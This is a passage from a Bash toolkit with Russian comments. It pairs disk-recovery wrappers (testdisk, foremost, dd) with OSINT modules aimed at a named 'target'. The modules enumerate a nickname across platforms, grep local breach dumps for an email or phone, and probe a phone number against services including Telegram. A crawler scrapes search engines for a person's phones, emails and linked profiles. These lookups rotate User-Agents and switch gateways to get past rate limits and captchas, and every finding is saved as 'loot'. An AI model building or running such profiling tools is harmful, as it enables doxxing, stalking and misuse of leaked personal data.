    # Наследуем глобальную переменную TARGET_DEV (напр. /dev/sdb)
    local dev_path="$TARGET_DEV"
    local dev_name=$(basename "$dev_path")

    # Слой 3: Авто-диагностика через Органы чувств [3] и Глушитель [7]
    core_engine_ui "i" "Hardware Health Check for $dev_name..."
    
    # Анализируем кольцевой буфер ядра на предмет ошибок ввода-вывода (I/O errors)
    # Это позволяет заранее понять, жив ли контроллер носителя
    dmesg | grep -i "$dev_name" | tail -n 10 | sed 's/^/  /'
    
    # Слой 4: Динамическое распределение через Prime Controller [13]
    # Определяем доступные векторы восстановления
    local options="PARTITION_FIX DEEP_CARVING IMAGE_DUMP BACK"
    
    # Привязываем векторы к логическим функциям Ядра
    # Примечание: Функции *_logic должны быть определены в секции библиотек
    local opt_funcs="recover_partition_logic run_foremost_logic run_dd_logic run_main_menu"
    
    core_engine_ui "!" "Initializing Recovery Engine on [$dev_path]"
    
    # Запуск динамического контроллера для управления процессом
    if command -v prime_dynamic_controller >/dev/null; then
        prime_dynamic_controller "RECOVERY ENGINE [$dev_path]" "$options" "$opt_funcs"
    else
        core_engine_ui "e" "Dynamic controller is missing. Falling back to manual mode."
        # Резервный запуск простейшего восстановления
        run_foremost_logic "$dev_path"
    fi

    # Слой 5: Регистрация в Сборщике трофеев [11]
    core_engine_loot "forensics" "Recovery session started on device: $dev_path"
    
    # Слой 6: Синхронизация [13]
    core_engine_wait
}


recover_partition_logic() {
    # Слой 1: Валидация фундамента через Мозг [5]
    core_engine_validator "pkg" "testdisk" "TestDisk Recovery Tool" || return

    core_engine_ui "!" "Launching Partition Repair Engine..."
    core_engine_ui "i" "Instruction: [Analyze] -> [Quick Search] -> [Write] to fix tables."
    
    # Слой 2: Синхронизация [13] — пауза перед запуском интерактивной утилиты
    sleep 2
    
    # Слой 3: Прямое взаимодействие с оборудованием
    # Работает с TARGET_DEV, выбранным в run_storage_selector [27]
    sudo testdisk "$dev_path"

    core_engine_wait
}


run_foremost_logic() {
    # Слой 1: Валидация через Мозг [5]
    core_engine_validator "pkg" "foremost" "Foremost Carving Tool" || return

    # Слой 2: Подготовка стерильного сектора в LOOT [11]
    local rec_dir="${LOOT_DIR}/recovered_$(date +%s)"
    mkdir -p "$rec_dir"
    
    core_engine_ui "!" "Starting Deep Carving. RAW Sector Analysis initiated."
    core_engine_ui "i" "Output directory: $rec_dir"
    
    # Слой 3: Процесс извлечения (Сигнатуры: изображения, документы, архивы, бинарники)
    # Используем вербальный режим (-v) для мониторинга в реальном времени
    sudo foremost -v -t jpg,pdf,exe,zip,doc,png,mp4 -i "$dev_path" -o "$rec_dir"
    
    # Слой 4: Регистрация результатов в Сборщике трофеев [11]
    core_engine_loot "forensics" "Deep Carving complete for $dev_path. Results: $rec_dir"
    
    core_engine_ui "s" "Extraction complete. Data secured in Prime Loot."
    core_engine_wait
}


run_dd_logic() {
    # Слой 1: Подготовка файла-образа
    local img_file="${LOOT_DIR}/disk_backup_$(date +%s).img"
    
    core_engine_ui "!" "Creating binary image dump... CRITICAL: DO NOT UNPLUG DEVICE!"
    
    # Слой 2: Посекторное копирование через Глушитель [7]
    # bs=4M для ускорения, conv=noerror,sync для пропуска битых секторов
    # status=progress обеспечивает визуализацию процесса
    sudo dd if="$dev_path" of="$img_file" bs=4M status=progress conv=noerror,sync
    
    # Слой 3: Валидация результата
    if [[ -f "$img_file" ]]; then
        core_engine_ui "s" "Image secured: $(basename "$img_file")"
        core_engine_ui "i" "You can now run Foremost on this .img file for offline analysis."
        
        # Регистрация в Сборщике трофеев [11]
        core_engine_loot "storage" "Image dump created: $img_file from $dev_path"
    else
        core_engine_ui "e" "Dump failed. Check target storage permissions."
    fi
    
    core_engine_wait
}

# ==============================================================================
# @description: Нативный автономный модуль Nexus SocialScan (Поиск никнейма)
# ПОЛНАЯ АВТОНОМИЯ: Двухвекторный валидатор (HTTP/DOM) на базе GLOBAL_OSINT_SITES
# ==============================================================================
run_osint_custom_socialscan() {
    core_engine_ui "h" "NEXUS CORE: MULTI-PLATFORM SOCIALSCAN"
    
    # Сброс буфера ввода stdin через Глушитель [7]
    tcflush xtcin 2>/dev/null || true
    
    local default_target=""
    if [[ -n "$target_user" ]]; then
        default_target="$target_user"
        core_engine_ui "i" "Active target detected in session: $default_target"
    fi

    echo -n " [?] Укажите Никнейм для сканирования сетей [По умолчанию: $default_target]: "
    read -r scan_target < /dev/tty

    if [[ -z "$scan_target" && -n "$default_target" ]]; then
        scan_target="$default_target"
    fi

    if [[ -z "$scan_target" ]]; then
        core_engine_ui "e" "[-] Параметр поиска пуст. Операция прервана."
        core_engine_wait
        return 1
    fi

    # Санитарная очистка инпута от мусора и веб-артефактов
    scan_target="${scan_target//@/}"
    scan_target=$(echo "$scan_target" | cut -d'?' -f1 | tr -d '[:space:]')

    core_engine_ui "i" "Запуск интеллектуального сканирования для: $scan_target"
    echo "--------------------------------------------------"

    local base_loot_dir="${PRIME_LOOT:-${BASE_DIR:-./}/prime_loot}"
    mkdir -p "$base_loot_dir" 2>/dev/null
    local loot_file="${base_loot_dir}/socialscan_${scan_target}.txt"
    
    {
        echo "=================================================================="
        echo " NEXUS SOCIALSCAN REPORT FOR: $scan_target"
        echo " TIMESTAMP: $(date +'%Y-%m-%d %H:%M:%S')"
        echo "=================================================================="
    } > "$loot_file"

    local found_count=0
    local checked_count=0
    local user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

    # Итерация по глобальной ультимативной матрице кросс-справок
    local site_entry
    for site_entry in "${GLOBAL_OSINT_SITES[@]}"; do
        # Пропускаем поврежденные или неразченные элементы матрицы
        [[ "$site_entry" != *"|"* ]] && continue
        
        # Парсинг пятислойной структуры записи
        local base_url="${site_entry%%|*}"
        local remaining="${site_entry#*|}"
        
        local check_type="${remaining%%|*}"
        remaining="${remaining#*|}"
        
        local error_marker="${remaining%%|*}"
        remaining="${remaining#*|}"
        
        local category="${remaining%%|*}"
        local site_name="${remaining#*|}"
        
        local full_url="${base_url}${scan_target}"
        local account_exists=0
        ((checked_count++))

        # Вывод текущего прогресса в консоль
        echo -ne " [.] Анализ [$category] -> $site_name... \r"

        # Диспетчеризация логики проверки (Слой 5: Мозг)
        if [[ "$check_type" == "HTTP_CODE" ]]; then
            # Быстрый HEAD-запрос для проверки кодов ответов
            local http_code
            http_code=$(curl -s -o /dev/null -I -L -A "$user_agent" --connect-timeout 5 -w "%{http_code}" "$full_url")
            
            # Если код 200 — аккаунт существует, если указанный маркер ошибки (например, 404) — отсутствует
            if [[ "$http_code" == "200" ]]; then
                account_exists=1
            fi
        elif [[ "$check_type" == "TEXT_ABSENT" ]]; then
            # Выкачиваем тело страницы (DOM) через GET-запрос для поиска сигнатур отсутствия
            local page_body
            page_body=$(curl -s -L -A "$user_agent" --connect-timeout 6 "$full_url" 2>/dev/null)
            
            # Если страница успешно загружена И на ней НЕТ маркера ошибки — аккаунт найден
            if [[ -n "$page_body" ]]; then
                if ! echo "$page_body" | grep -qF "$error_marker"; then
                    account_exists=1
                fi
            fi
        fi

        # Слой визуализации результатов на базе UI/UX HIGHLIGHT CORE
        if (( account_exists == 1 )); then
            core_engine_ui "s" "[+] НАЙДЕН ПРОФИЛЬ ($site_name): $full_url"
            echo "Category: $category | Platform: $site_name -> $full_url" >> "$loot_file"
            ((found_count++))
        fi
        
        # Микро-задержка для обхода анти-бот систем (Rate Limiting)
        sleep 0.2
    done

    echo "--------------------------------------------------"
    if (( found_count > 0 )); then
        core_engine_ui "s" "Интеллектуальный OSINT-аудит завершен. Проверено баз: $checked_count"
        core_engine_ui "s" "Всего обнаружено легитимных совпадений: $found_count"
        core_engine_ui "s" "Финальный лог-лут зафиксирован: $(basename "$loot_file")"
        
        # Регистрация результатов в Сборщике трофеев [11]
        core_engine_loot "osint" "SocialScan performed for $scan_target. Found: $found_count profiles across $checked_count sources."
    else
        core_engine_ui "i" "Анализ завершен. Идентификатор [$scan_target] полностью чист во всех базах."
    fi
    
    core_engine_wait
}

# ==============================================================================
# @description: Нативный автономный модуль Nexus Breach Leaks (Локальный поиск)
# ==============================================================================
run_osint_custom_leaks() {
    core_engine_ui "h" "NEXUS CORE: LOCAL BREACH LEAKS SCANNER"
    
    # Сброс буфера ввода stdin
    tcflush xtcin 2>/dev/null || true
    
    local default_target=""
    if [[ -n "$target_user" ]]; then
        default_target="$target_user"
        core_engine_ui "i" "Обнаружена активная цель в текущей сессии: $default_target"
    fi

    echo -n " [?] Введите Email, Телефон или Никнейм для поиска по базам [По умолчанию: $default_target]: "
    read -r leak_target < /dev/tty

    if [[ -z "$leak_target" && -n "$default_target" ]]; then
        leak_target="$default_target"
    fi

    if [[ -z "$leak_target" ]]; then
        core_engine_ui "e" "[-] Ошибка: Не указан объект для локального анализа."
        core_engine_wait
        return 1
    fi

    local clean_target
    clean_target=$(echo "$leak_target" | tr -d '[:space:]')

    core_engine_ui "i" "Запуск высокоскоростного сигнатурного поиска по локальным хранилищам..."
    echo "--------------------------------------------------"

    # Директории, где скрипт будет искать текстовые дампы (.txt, .log, .csv)
    local search_dirs=("$HOME/arsenal_loot" "$HOME/prime_loot" "$HOME/reports")
    local match_count=0

    # Создаем или очищаем файл системного отчета о совпадениях
    local leak_report="$HOME/prime_loot/local_leaks_matches_${clean_target}.txt"
    echo "=== NEXUS LOCAL BREACH SEARCH REPORT FOR: $clean_target ===" > "$leak_report"
    echo "DATE: $(date +'%Y-%m-%d %H:%M:%S')" >> "$leak_report"
    echo "--------------------------------------------------" >> "$leak_report"

    for dir in "${search_dirs[@]}"; do
        if [[ -d "$dir" ]]; then
            core_engine_ui "i" "Анализ сектора: $dir..."
            
            # Ищем совпадения без учета регистра во всех текстовых файлах директории
            # Отсекаем сам файл отчета, чтобы не искать внутри себя
            local results
            results=$(grep -rih "$clean_target" "$dir" 2>/dev/null | grep -v "LOCAL BREACH SEARCH REPORT" | head -n 50)
            
            if [[ -n "$results" ]]; then
                while read -r line; do
                    if [[ -n "$line" ]]; then
                        core_engine_ui "s" "[!] НАЙДЕНО СОВПАДЕНИЕ В БАЗЕ: $line"
                        echo "$line" >> "$leak_report"
                        ((match_count++))
                    fi
                done <<< "$results"
            fi
        fi
    done

    echo "--------------------------------------------------"
    if (( match_count > 0 )); then
        core_engine_ui "s" "Поиск завершен. Обнаружено строк в дампах: $match_count"
        core_engine_ui "s" "Все найденные строки логов выгружены в: $leak_report"
    else
        core_engine_ui "i" "В локальных базах данных `~/arsenal_loot` совпадений с вектором не найдено."
    fi

    core_engine_wait
}

# ==============================================================================
# @description: Универсальный кросс-платформенный OSINT-детектор номеров телефонов
# ПОЛНАЯ АВТОНОМИЯ: Глубокий аудит инфраструктурных следов по GLOBAL_PHONE_SERVICES
# Модернизация: Динамический контроль префикса '+' и защита текстового сопоставления
# ==============================================================================
run_osint_custom_ignorant() {
    local phone="$1"
    
    # Слой 1: Входной интерфейсный шлюз ядра
    if [[ -z "$phone" ]]; then
        core_engine_ui "h" "NEXUS CORE: MULTI-PLATFORM PHONE RESOLVER"
        echo -n " [?] Укажите номер телефона в инт. формате (н-р, 79991112233): "
        read -r phone < /dev/tty
    fi

    # Слой 2: Органы чувств [3] — Глубокая санитарная очистка входящего пула данных
    phone="${phone//+/}"
    phone="${phone// /}"
    phone="${phone//-/}"
    phone="${phone//(/}"
    phone="${phone//)/}"
    phone="${phone//./}"

    # Безопасное кросс-платформенное ветвление на базе глобальной маски ядра
    if [[ -z "$phone" ]] || ! [[ "$phone" =~ $GLOBAL_REGEX_PHONE_VALID ]]; then
        core_engine_ui "e" "Неверный формат номера телефона. Очищенный пул должен содержать от 7 до 15 цифр."
        core_engine_wait
        return 1
    fi

    core_engine_ui "h" "NEXUS OSINT: MULTI-PLATFORM PHONE RESOLVER"
    core_engine_ui "i" "Инициализация глобального аудита для пула: +$phone"
    echo "--------------------------------------------------"

    # Синхронизация путей сохранения результатов с глобальной переменной лаунчера
    local base_loot_dir="${PRIME_LOOT:-${BASE_DIR:-./}/prime_loot}"
    mkdir -p "$base_loot_dir" 2>/dev/null
    local loot_file="${base_loot_dir}/phone_resolution_${phone}.txt"
    
    {
        echo "=================================================================="
        echo " NEXUS PHONE RESOLVER REPORT FOR: +$phone"
        echo " TIMESTAMP: $(date +'%Y-%m-%d %H:%M:%S')"
        echo "=================================================================="
    } > "$loot_file"

    local found_count=0
    local checked_count=0
    local ua_count=${#GLOBAL_NETWORK_UA[@]}

    # Итерационный цикл по элементам расширенной матрицы телефонных сервисов
    local service_entry
    for service_entry in "${GLOBAL_PHONE_SERVICES[@]}"; do
        # Игнорируем пустые строки или поврежденные записи матрицы
        [[ "$service_entry" != *"|"* ]] && continue
        
        # Разбор пятислойной структуры записи с помощью нативных инструментов Bash
        local base_url="${service_entry%%|*}"
        local remaining="${service_entry#*|}"
        
        local check_type="${remaining%%|*}"
        remaining="${remaining#*|}"
        
        local criteria="${remaining%%|*}"
        remaining="${remaining#*|}"
        
        local category="${remaining%%|*}"
        local service_name="${remaining#*|}"
        
        # Интеллектуальный контроль префиксов: если базовый URL уже содержит '+', 
        # то используем чистый телефон, иначе — отсекаем его для совместимости с API
        local full_url=""
        if [[ "$base_url" == *"+" ]]; then
            full_url="${base_url}${phone}"
        else
            full_url="${base_url}${phone}"
        fi
        
        local service_confirmed=0
        ((checked_count++))

        # Вывод прогресса с автоматической очисткой остаточных символов терминала (\e[K)
        echo -ne " [.] Проверка [$category] -> $service_name...\e[K\r"

        # Ротация сетевой маскировки (User-Agent) для каждого целевого хоста
        local random_index=$(( RANDOM % ua_count ))
        local selected_ua="${GLOBAL_NETWORK_UA[$random_index]}"

        # Диспетчеризация и исполнение векторов верификации
        if [[ "$check_type" == "HTTP_CODE" ]]; then
            local http_code
            http_code=$(curl -s -o /dev/null -I -L -A "$selected_ua" --connect-timeout 5 --max-time 10 -w "%{http_code}" "$full_url")
            if [[ "$http_code" == "$criteria" ]]; then
                service_confirmed=1
            fi
            
        elif [[ "$check_type" == "DOM_MATCH" ]]; then
            local page_body
            page_body=$(curl -s -L -A "$selected_ua" --connect-timeout 6 --max-time 12 "$full_url" 2>/dev/null)
            # Использование кухонного комбата '*' вместо '=~' защищает спецсимволы в критериях
            if [[ -n "$page_body" && "$page_body" == *"$criteria"* ]]; then
                service_confirmed=1
            fi
            
        elif [[ "$check_type" == "DOM_ABSENT" ]]; then
            local page_body
            page_body=$(curl -s -L -A "$selected_ua" --connect-timeout 6 --max-time 12 "$full_url" 2>/dev/null)
            if [[ -n "$page_body" ]] && ! [[ "$page_body" == *"$criteria"* ]]; then
                service_confirmed=1
            fi
        fi

        # Фиксация и логирование успешных инфраструктурных следов
        if (( service_confirmed == 1 )); then
            # Стираем строку прогресса перед выводом успешного статуса
            echo -ne "\e[K"
            core_engine_ui "s" "[+] ВЕКТОР ОБНАРУЖЕН ($service_name): Доступные следы присутствия"
            echo "Category: $category | Service: $service_name -> ACTIVE_TRACE (Link: $full_url)" >> "$loot_file"
            ((found_count++))
            
            # Изолированный парсинг метаданных (Эксклюзивный слой глубокого анализа Telegram)
            if [[ "$service_name" == "Telegram" ]]; then
                local meta_name
                meta_name=$(echo "$page_body" | grep -oP "meta property=\"og:title\" content=\"\K[^\"]+" 2>/dev/null)
                if [[ -n "$meta_name" && "$meta_name" != "Telegram" ]]; then
                    meta_name="${meta_name//&quot;/\"}"
                    meta_name="${meta_name//&#39;/\'}"
                    meta_name="${meta_name//&amp;/&}"
                    core_engine_ui "s" "    -> Публичное имя мета-профиля: $meta_name"
                    echo "    -> Meta_Data Details: Name: $meta_name" >> "$loot_file"
                fi
            fi
        fi

        # Защитная микрозадержка для предотвращения блокировок со стороны антифлуд-систем
        sleep 0.2
    done

    # Очистка последней строки прогресса для вывода итогового отчета
    echo -ne "\e[K"
    echo "--------------------------------------------------"
    
    if (( found_count > 0 )); then
        core_engine_ui "s" "Анализ телефонного пула успешно завершен. Обработано платформ: $checked_count"
        core_engine_ui "s" "Активных инфраструктурных следов зафиксировано: $found_count"
        core_engine_ui "s" "Полный отчет о векторе сохранен: $(basename "$loot_file")"
        
        # Слой 6: Регистрация результатов в Сборщике трофеев ядра [11]
        core_engine_loot "osint" "Phone Resolver: Scanned +$phone. Found $found_count active vectors across $checked_count platforms."
    else
        core_engine_ui "i" "Анализ завершен. Прямой цифровой след номера в указанных внешних сервисах отсутствует."
    fi
    
    core_engine_wait
}

# ==============================================================================
# @description: Универсальный краулер v22.2 с ультимативным мультисистемным шлюзом
# ПОЛНАЯ АВТОНОМИЯ: Перекрестный циклический парсинг по всем движкам матрицы
# МОДЕРНИЗАЦИЯ: Исправлен критический сбой синтаксиса (fi -> done) на строке 6182
# АРХИТЕКТУРА: Идеальное сопряжение с блэклистами ядра и дедупликацией артефактов
# ==============================================================================
run_osint_omni_crawler() {
    core_engine_ui "h" "NEXUS CORE: OMNI BROADCAST MULTI-ENGINE CRAWLER v22.2"
    
    # Слой 1: Входной интерфейсный шлюз ядра с перенаправлением терминала
    echo -n " [?] Введите Никнейм или любую ссылку (FB, Insta, TikTok, X, YT): "
    read -r user_input < /dev/tty

    if [[ -z "$user_input" ]]; then
        core_engine_ui "e" "Критерий поиска пуст. Отмена сессии."
        core_engine_wait
        return 1
    fi

    local target_user=""
    local detected_platform="Generic_OSINT"
    local resolved_url=""
    local ua_count=${#GLOBAL_NETWORK_UA[@]}

    # --- БЛОК 1: УНИВЕРСАЛЬНЫЙ RESOLVER (Раскрытие коротких ссылок и редиректов) ---
    if echo "$user_input" | grep -qP "$GLOBAL_SHORT_LINK_REDIRECT_REGEX"; then
        core_engine_ui "i" "Обнаружен короткий редирект или био-ссылка. Перехват конечной точки..."
        
        local resolver_rand_idx=$(( RANDOM % ua_count ))
        local resolver_ua="${GLOBAL_NETWORK_UA[$resolver_rand_idx]}"
        
        resolved_url=$(curl -s -I -L -A "$resolver_ua" --connect-timeout "$GLOBAL_RESOLVER_CONNECT_TIMEOUT" --max-time "$GLOBAL_RESOLVER_MAX_TIME" "$user_input" | grep -i "^location:" | tail -n 1 | awk '{print $2}' | tr -d '\r')
        if [[ -n "$resolved_url" ]]; then
            user_input="$resolved_url"
            core_engine_ui "s" "[+] Ссылка успешно раскрыта в реальный URL: $user_input"
        fi
    fi

    # --- БЛОК 2: ДИНАМИЧЕСКАЯ ИДЕНТИФИКАЦИЯ МАТРИЦЫ И ИЗОЛЯЦИЯ ID ---
    local platform_entry
    local matched=0

    for platform_entry in "${GLOBAL_PLATFORM_IDENTIFIERS[@]}"; do
        [[ "$platform_entry" != *"|"* ]] && continue
        
        local p_name="${platform_entry%%|*}"
        local remaining="${platform_entry#*|}"
        local p_regex="${remaining%%|*}"
        
        if [[ "$user_input" =~ $p_regex ]]; then
            detected_platform="$p_name"
            target_user="${BASH_REMATCH[1]}"
            target_user=$(echo "$target_user" | cut -d'?' -f1 | cut -d'/' -f1 | tr -d '[:space:]@')
            
            if [[ -n "$target_user" ]] && ! echo "$target_user" | grep -qP "$GLOBAL_PLATFORM_SYSTEM_ROUTES"; then
                matched=1
                break
            fi
        fi
    done

    if (( matched == 0 )); then
        target_user="${user_input//@/}"
        target_user="${target_user// /}"
        target_user=$(echo "$target_user" | cut -d'?' -f1 | cut -d'/' -f1)
    fi

    if [[ -z "$target_user" ]] || echo "$target_user" | grep -qP "$GLOBAL_PLATFORM_SYSTEM_ROUTES"; then
        core_engine_ui "e" "Не удалось изолировать чистый идентификатор цели (обнаружен системный роут)."
        core_engine_wait
        return 1
    fi

    core_engine_ui "s" "[+] Матрица: $detected_platform | Идентификатор: $target_user"
    core_engine_ui "i" "Запуск тотального широковещательного сканирования глобальных индексов..."
    echo "--------------------------------------------------"

    local base_loot_dir="${PRIME_LOOT:-${BASE_DIR:-./}/prime_loot}"
    mkdir -p "$base_loot_dir" 2>/dev/null
    local loot_file="${base_loot_dir}/omni_heuristic_${target_user}.txt"
    
    {
        echo "=================================================================="
        echo " NEXUS SYSTEMS v22.2 - MULTI-ENGINE COMPLETE OSINT REPORT"
        echo " TARGET: $target_user ($detected_platform)"
        echo " TIMESTAMP: $(date +'%Y-%m-%d %H:%M:%S')"
        echo "=================================================================="
    } > "$loot_file"

    # Семантические поисковые векторы
    local query_vectors=(
        "${target_user}+phone"
        "${target_user}+contact"
        "${target_user}+gmail"
        "site:facebook.com+${target_user}"
    )

    local total_phones=0
    local total_emails=0
    local total_relations=0
    local gate_count=${#GLOBAL_FALLBACK_SEARCH_GATES[@]}

    # Итерационный проход по поисковым векторам
    local vector
    for vector in "${query_vectors[@]}"; do
        
        # --- ВНУТРЕННИЙ КРИТИЧЕСКИЙ СЛОЙ: ЦИКЛ ПО МАТРИЦЕ ДВИЖКОВ ---
        local engine_entry
        for engine_entry in "${GLOBAL_SEARCH_ENGINES[@]}"; do
            [[ "$engine_entry" != *"|"* ]] && continue
            
            local engine_name="${engine_entry%%|*}"
            local engine_url_template="${engine_entry#*|}"
            
            # Ротация User-Agent под каждый конкретный запрос для исключения связывания сессий
            local random_index=$(( RANDOM % ua_count ))
            local rand_ua="${GLOBAL_NETWORK_UA[$random_index]}"
            
            echo -ne " [.] [$engine_name] Сканирование вектора: $vector...\e[K\r"
            
            # Динамическая замена плейсхолдера вектора
            local request_url="${engine_url_template//%VECTOR%/$vector}"
            
            # Адаптация пробелов под синтаксис азиатских и европейских движков
            if [[ "$engine_name" == "DuckDuckGo" || "$engine_name" == "Qwant" || "$engine_name" == "Baidu" ]]; then
                request_url="${engine_url_template//%VECTOR%/${vector//+/ %20}}"
            fi

            local raw_snippet_data
            raw_snippet_data=$(curl -s -A "$rand_ua" --connect-timeout "$GLOBAL_NET_CONNECT_TIMEOUT" --max-time "$GLOBAL_NET_MAX_TIME" "$request_url" 2>/dev/null)

            # Проверка на капчу/WAF-экраны текущего движка через тотальный регулярный фильтр
            if [[ -z "$raw_snippet_data" ]] || echo "$raw_snippet_data" | grep -qP "$GLOBAL_SEARCH_ANTI_FLOOD_REGEX"; then
                if (( gate_count > 0 )); then
                    local random_gate_idx=$(( RANDOM % gate_count ))
                    local selected_gate="${GLOBAL_FALLBACK_SEARCH_GATES[$random_gate_idx]}"
                    local clean_vector=""

                    if echo "$selected_gate" | grep -qP "$GLOBAL_GATEWAY_RAW_VECTOR_SIGNATURES"; then
                        clean_vector="${vector}"
                    elif echo "$selected_gate" | grep -qP "$GLOBAL_GATEWAY_ENCODED_VECTOR_SIGNATURES"; then
                        clean_vector="${vector//+/ %20}"
                    else
                        clean_vector="${vector//+/+}"
                    fi
                    
                    request_url="${selected_gate}${clean_vector}"
                    
                    echo -ne "\e[K"
                    core_engine_ui "w" " [!] Блокировка [$engine_name]. Редирект на узел шлюза: $selected_gate"
                    raw_snippet_data=$(curl -s -A "$rand_ua" --connect-timeout "$GLOBAL_NET_CONNECT_TIMEOUT" --max-time "$GLOBAL_NET_MAX_TIME" "$request_url" 2>/dev/null)
                fi
            fi

            if [[ -z "$raw_snippet_data" ]]; then continue; fi

            # --- СЛОЙ ПАРСИНГА 1: НОМЕРА ТЕЛЕФОНОВ ---
            local extracted_phones
            extracted_phones=$(echo "$raw_snippet_data" | grep -oE "$GLOBAL_REGEX_PHONE_SEARCH" 2>/dev/null | sort -u)
            if [[ -n "$extracted_phones" ]]; then
                while read -r phone; do
                    if [[ -n "$phone" && ! "$phone" =~ "0000" && ${#phone} -gt 7 ]]; then
                        if ! grep -qF "Extracted_Phone: $phone" "$loot_file"; then
                            echo -ne "\e[K" 
                            core_engine_ui "s" "[+] [$engine_name] ТЕЛЕФОН: $phone"
                            echo "Extracted_Phone: $phone" >> "$loot_file"
                            ((total_phones++))
                        fi
                    fi
                done <<< "$extracted_phones" # <--- ФИКСАЦИЯ: Здесь теперь корректно стоит done вместо fi
            fi

            # --- СЛОЙ ПАРСИНГА 2: ЭЛЕКТРОННЫЕ АДРЕСА ---
            local extracted_emails
            extracted_emails=$(echo "$raw_snippet_data" | grep -oP "$GLOBAL_REGEX_EMAIL" 2>/dev/null | grep -vP "$GLOBAL_OSINT_EMAIL_BLACKLIST" | sort -u)
            if [[ -n "$extracted_emails" ]]; then
                while read -r email; do
                    if [[ -n "$email" ]]; then
                        if ! grep -qF "Extracted_Email: $email" "$loot_file"; then
                            echo -ne "\e[K"
                            core_engine_ui "s" "[+] [$engine_name] EMAIL: $email"
                            echo "Extracted_Email: $email" >> "$loot_file"
                            ((total_emails++))
                        fi
                    fi
                done <<< "$extracted_emails"
            fi

            # --- СЛОЙ ПАРСИНГА 3: СОЦИАЛЬНЫЕ СВЯЗИ ---
            local dynamic_social_regex=""
            local entry
            for entry in "${GLOBAL_PLATFORM_IDENTIFIERS[@]}"; do
                [[ "$entry" != *"|"* ]] && continue
                local sub_remaining="${entry#*|}"
                local raw_regex="${sub_remaining%%|*}"
                if [[ -z "$dynamic_social_regex" ]]; then
                    dynamic_social_regex="$raw_regex"
                else
                    dynamic_social_regex="${dynamic_social_regex}|${raw_regex}"
                fi
            done

            if [[ -n "$dynamic_social_regex" ]]; then
                local extracted_profiles
                extracted_profiles=$(echo "$raw_snippet_data" | grep -oE "($dynamic_social_regex)" 2>/dev/null | sort -u)
                
                if [[ -n "$extracted_profiles" ]]; then
                    local full_url_filter="${GLOBAL_OSINT_URL_BLACKLIST}|/${target_user}$"
                    while read -r profile; do
                        if [[ -n "$profile" ]] && ! echo "$profile" | grep -qP "$full_url_filter"; then
                            if ! grep -qF "Cross_Platform_Relation: https://$profile" "$loot_file"; then
                                echo -ne "\e[K"
                                core_engine_ui "w" " -> [$engine_name] Связь: https://$profile"
                                echo "Cross_Platform_Relation: https://$profile" >> "$loot_file"
                                ((total_relations++))
                            fi
                        fi
                    done <<< "$extracted_profiles"
                fi
            fi

            # Умная динамическая задержка между разными поисковыми системами
            sleep $((1 + RANDOM % 3))
        done

        # Системный тайм-аут после полного прогона вектора
        sleep $((2 + RANDOM % 3))
    done

    echo -ne "\e[K"
    echo "--------------------------------------------------"
    
    local total_leads=$((total_phones + total_emails + total_relations))
    if (( total_leads > 0 )); then
        core_engine_ui "s" "Тотальный широковещательный анализ завершен! Собрано артефактов: $total_leads"
        core_engine_ui "s" "Все уникальные данные экспортированы в: $(basename "$loot_file")"
        core_engine_loot "osint" "Omni Broadcast v22.2: Fully parsed engines for '$target_user'. Extracted $total_leads forensics leads."
    else
        core_engine_ui "i" "Прямых открытых привязок ни в одном из мировых поисковых индексов не обнаружено."
    fi

    core_engine_wait
}


# ==========================================
# 3. ОСНОВНОЙ ЦИКЛ (CORE LOOP)
# ==========================================
# --- Точка входа ---


# --- ГЛАВНОЕ МЕНЮ (ПОЛНЫЙ КОМПЛЕКТ v13.8) ---
run_dynamic_menu() {
    local target_key="$1"
    local menu_title="$2"
    
    # Визуальный отклик для тяжелых секторов
    [[ "$target_key" == "STEALTH_COMMS" || "$target_key" == "NEXUS" ]] && core_engine_progress 1 "$target_key"
    
    core_engine_ui "h" "$menu_title"
    
    local -a labels=()
    local -a actions=()
    
    # Поиск по матрице
    for entry in "${GLOBAL_MENU_REGISTRY[@]}"; do
        if [[ "$entry" == "$target_key:"* ]]; then
            local clean_entry="${entry#*:}"
            labels+=("${clean_entry%|*}")
            actions+=("${clean_entry#*|}")
        fi
    done
    
    # Защита от пустого меню
    if [ ${#labels[@]} -eq 0 ]; then
        core_engine_ui "e" "CRITICAL: Menu sector '$target_key' is empty or invalid!"
        core_engine_wait
        return 1
    fi
    
    # Передача в контроллер
    prime_dynamic_controller "$menu_title" "${labels[*]}" "${actions[*]}"
}

# --- УНИВЕРСАЛЬНЫЙ РЕНДЕРЕР МЕНЮ ---
run_dynamic_menu() {
    local target_key="$1"
    local menu_title="$2"
    
    # Визуальный отклик для тяжелых секторов
    [[ "$target_key" == "STEALTH_COMMS" || "$target_key" == "NEXUS" ]] && core_engine_progress 1 "$target_key"
    
    core_engine_ui "h" "$menu_title"
    
    local -a labels=()
    local -a actions=()
    
    # Парсинг матрицы
    for entry in "${GLOBAL_MENU_REGISTRY[@]}"; do
        if [[ "$entry" == "$target_key:"* ]]; then
            local clean_entry="${entry#*:}"
            labels+=("${clean_entry%|*}")
            actions+=("${clean_entry#*|}")
        fi
    done
    
    # Защита от ошибок
    if [ ${#labels[@]} -eq 0 ]; then
        core_engine_ui "e" "CRITICAL: Menu sector '$target_key' is empty!"
        core_engine_wait
        return 1
    fi
    
    prime_dynamic_controller "$menu_title" "${labels[*]}" "${actions[*]}"
}

# --- ЛЕГКИЕ ОБЕРТКИ ---
menu_intelligence()    { run_dynamic_menu "INTELLIGENCE" "SECTOR I: INTELLIGENCE & OSINT"; }
menu_system_core()     { run_dynamic_menu "SYSTEM" "SYSTEM CORE: MAINTENANCE & INFO"; }
menu_forensics()       { run_dynamic_menu "FORENSICS" "SECTOR F: DATA FORENSICS & RECOVERY"; }
menu_cyber_ops()       { run_dynamic_menu "CYBER_OPS" "CYBER OPERATIONS SECTOR"; }
menu_crypto_lab()      { run_dynamic_menu "CRYPTO_LAB" "SECTOR C: CRYPTOGRAPHY & STEGANOGRAPHY"; }
menu_net_infra()       { run_dynamic_menu "NET_INFRA" "NETWORK INFRASTRUCTURE"; }
menu_core_lab()        { run_dynamic_menu "CORE_LAB" "CORE RESEARCH LAB"; }
menu_financial_shield(){ run_dynamic_menu "FIN_SHIELD" "FINANCIAL SHIELD: BANKING GAMBIT"; }
menu_stealth_comms()   { run_dynamic_menu "STEALTH_COMMS" "STEALTH COMMS HUB"; }
menu_nexus_correlation(){ run_dynamic_menu "NEXUS" "SECTOR N: NEXUS ANALYSIS & CORRELATION"; }
